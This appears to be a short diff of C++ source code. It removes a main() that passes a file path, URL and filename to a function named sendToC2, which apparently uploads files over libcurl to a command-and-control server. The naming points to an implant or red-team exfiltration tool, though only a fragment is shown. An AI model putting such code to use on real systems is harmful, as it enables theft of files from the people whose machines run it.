@@ -55,13 +55,3 @@ void sendToC2(string path, string url, string filename, string taskid) {
 		curl_formfree(formpost);
 	}
 }
-
-
-
-int main(int argc, char* argv[]) {
-	string path = argv[1];
-	string url = argv[2];
-	string filename = argv[3];
-	sendToC2(path, url, filename, "1");
-}
-
